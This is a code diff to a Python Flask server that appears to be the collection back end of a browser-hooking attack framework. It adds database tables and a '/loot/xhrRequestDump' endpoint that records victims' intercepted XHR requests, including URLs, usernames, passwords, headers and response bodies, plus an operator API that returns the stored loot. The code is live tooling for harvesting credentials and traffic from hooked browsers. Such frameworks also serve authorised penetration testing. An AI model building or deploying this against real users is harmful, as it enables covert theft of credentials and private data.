@@ -385,7 +385,7 @@ class XhrOpen(Base):
 
 
 class XhrSetHeader(Base):
-    __tablename__ = 'xhrheader'
+    __tablename__ = 'xhrsetheader'
 
     id        = Column(Integer, primary_key=True)
     clientID  = Column(String(100), nullable=False)
@@ -408,6 +408,42 @@ class XhrCall(Base):
 
     def __repr__(self):
         return f'<XhrCall {self.id}>'
+
+
+# For refactor
+class XhrApiCall(Base):
+    __tablename__ = 'xhrapicall'
+
+    id             = Column(Integer, primary_key=True)
+    clientID       = Column(String(100), nullable=False)
+    method         = Column(String(100), nullable=False)
+    url            = Column(Text, nullable=False)
+    asyncRequest   = Column(Boolean, default=True)
+    user           = Column(String(100), nullable=True)
+    password       = Column(String(100), nullable=True)
+    requestBody    = Column(Text, nullable=True)
+    responseBody   = Column(Text, nullable=True)
+    responseStatus = Column(Integer, nullable=True)
+    timeStamp      = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<XhrApiCall {self.id}>'
+
+# For refactor
+class XhrHeader(Base):
+    __tablename__ = 'xhrheader'
+
+    id        = Column(Integer, primary_key=True)
+    apiCallID = Column(Integer, nullable=False)
+    clientID  = Column(String(100), nullable=False)
+    header    = Column(Text, nullable=False)
+    value     = Column(Text, nullable=False)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<XhrHeader {self.id}>'
+
+
 
 
 class FetchSetup(Base):
@@ -810,6 +846,8 @@ try:
                     XhrOpen.__table__.drop(engine)
                     XhrSetHeader.__table__.drop(engine)
                     XhrCall.__table__.drop(engine)
+                    XhrApiCall.__table__.drop(engine)
+                    XhrHeader.__table__.drop(engine)
                     FetchSetup.__table__.drop(engine)
                     FetchHeader.__table__.drop(engine)
                     FetchCall.__table__.drop(engine)
@@ -1512,6 +1550,56 @@ def recordXhrCall(identifier):
 
 
 
+
+
+# Dump the full XHR api call info
+@app.route('/loot/xhrRequestDump/<identifier>', methods=['POST'])
+def recordXhrDump(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    print("Got XHR dump: ")
+    print(request.json)
+
+    content        = request.json
+    method         = content.get('method')
+    url            = content.get('url')
+    asyncRequest   = content.get('async', True)
+    requestBody    = content.get('body')
+    user           = content.get('user')
+    password       = content.get('password')
+    headers        = content.get('headers', {})
+    responseBody   = content.get('responseBody')
+    responseStatus = content.get('responseStatus')
+
+    newXhrApiCall = XhrApiCall(clientID=identifier, method=method, url=url, asyncRequest=asyncRequest, user=user, password=password, requestBody=requestBody, responseBody=responseBody, responseStatus=responseStatus)
+    db_session.add(newXhrApiCall)
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    dbCommit()
+
+    # add to global event table
+    db_session.refresh(newXhrApiCall)
+    newEvent  = Event(clientID=identifier, timeStamp=newXhrApiCall.timeStamp, 
+    eventType ='XHRAPICALL', eventID=newXhrApiCall.id)
+    db_session.add(newEvent)
+
+    for header, value in headers.items():
+        newHeader = XhrHeader(apiCallID=newXhrApiCall.id, clientID=identifier, header=header, value=value)
+        db_session.add(newHeader)
+
+    dbCommit()    
+
+    return "ok", 200   
+
+
+
+
 # Record Fetch API Setup
 @app.route('/loot/fetchSetup/<identifier>', methods=['POST'])
 def recordFetchSetup(identifier):
@@ -1854,6 +1942,34 @@ def getClientXhrCall(key):
     xhrCallData = {'requestBody':xhrCall.requestBody, 'responseBody':xhrCall.responseBody}
 
     return jsonify(xhrCallData)
+
+
+
+
+
+@app.route('/api/clientXhrApiCall/<key>', methods=['GET'])
+@login_required
+def getClientXhrApiCall(key):
+    xhrApiCall = XhrApiCall.query.filter_by(id=key).first()
+    xhrHeaders = XhrHeader.query.filter_by(clientID=key).all()
+
+    headers_list = [{'header': header.header, 'value': header.value} for header in xhrHeaders]
+
+    xhrCallData = {
+        'method': escape(xhrApiCall.method),
+        'url': escape(xhrApiCall.url),
+        'asyncRequest': escape(xhrApiCall.asyncRequest),
+        'user': escape(xhrApiCall.user),
+        'password': escape(xhrApiCall.password),
+        'requestBody': xhrApiCall.requestBody, # escape client side after b64 decode
+        'responseBody': xhrApiCall.responseBody, # escape client side after b64 decode
+        'responseStatus': escape(xhrApiCall.responseStatus),
+        'headers': escape(headers_list)
+    }
+
+    return jsonify(xhrCallData)
+
+
 
 
 
